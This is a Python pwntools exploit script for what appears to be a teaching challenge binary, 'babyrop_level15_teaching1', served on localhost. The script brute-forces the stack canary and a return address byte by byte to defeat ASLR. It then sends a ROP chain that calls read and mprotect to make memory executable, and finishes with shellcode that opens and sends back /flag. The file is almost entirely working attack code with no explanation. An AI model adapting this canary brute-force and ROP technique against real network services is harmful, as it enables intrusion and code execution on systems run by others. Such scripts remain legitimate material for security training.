from pwn import *
from subprocess import check_output

e = ELF('./babyrop_level15_teaching1')
libc = e.libc

canary = b'\x00'
# canary = b'\x00k\xf5\xbf\xad\x8b\xf7\xdb'
canary = b'\x00 \xc1\xdbV\x13\xcev'

while len(canary) < 8:
    for i in range(256):
        if i == 0x10:continue
        print(i)
        # context.log_level = 20
        # p = s.process(['nc','localhost','1337'])
        p = remote('localhost', 1337)
        # context.log_level = 0

        pay = b'A' * 0x78 + canary + bytes([i])
        p.send(pay)

        p.recvuntil(b'Exiting!\n')
        try:
            x = p.recv()
        except:
            canary += bytes([i])
            print(canary)
            break
            pass
        print(x)
        # print()
        p.close()

    print(x)
    print(canary)
    # pause() 
    p.close()

RET = b'\xc0'

while len(RET) < 6:
    for i in range(256):
        if i == 0x10:continue
        # if len(RET) == 1: i = (i << 4) | 15
        print(i)
        # p = s.process(['nc','localhost','1337'])
        p = remote('localhost', 1337)
        
        # pid = p.pid
        pay = b'A' * 0x78 + canary + p64(0) + RET + bytes([i])

        p.send(pay)

        x = p.recvuntil(b'Exiting!\n')
        print(x)
        try:
            x = p.recvuntil('###')
            print(x)
            RET += bytes([i])
            break
        except:
            pass
        p.close()

    # pid= check_output(f'ps -ef | grep {e.path}',shell=True).decode().split('\n')[1].split()[1]

    # print(pid)
    # check_output(['kill','-9',pid])

    p.close()

    print(RET[::-1].hex())
    print(RET)

base = u64(RET + b'\x00\x00') - 0x2a9c0
# e.address = pie

# rdi = 0x00000000000019e3 + pie

print(hex(base))
libc.address = base


# p = s.process(['nc','localhost','1337'])
# pid= p.pid
p = remote('localhost', 1337)

rdi = 0x0000000000026b72 + base
rsi = 0x0000000000027529 + base
rcx = 0x000000000009f822 + base
rdx_r12 = 0x000000000011c371 + base

pay = b'A' * 0x78 + canary + p64(0)
pay += p64(rdi) + p64(0) + p64(rsi) + p64(libc.bss() + 0x100) + p64(rdx_r12) + p64(0x100) + p64(0) + p64(libc.symbols['read'])
pay += p64(rdi) + p64((libc.bss() + 0x100)&0xFFFFFFFFFFFFF000) + p64(rsi) + p64(0x1000) + p64(rdx_r12) + p64(7) + p64(0) + p64(libc.symbols['mprotect'])
pay += p64(libc.bss() + 0x100)
# pay = pay.ljust(0x1000, b'\x00')


context.os = e.os
context.arch = e.arch

p.send(pay)

pay = asm(shellcraft.open('/flag\x00',0))
pay += asm(shellcraft.sendfile(1, 'rax', 0, 0x1000))

sleep(0.1)
p.send(pay)

p.interactive()
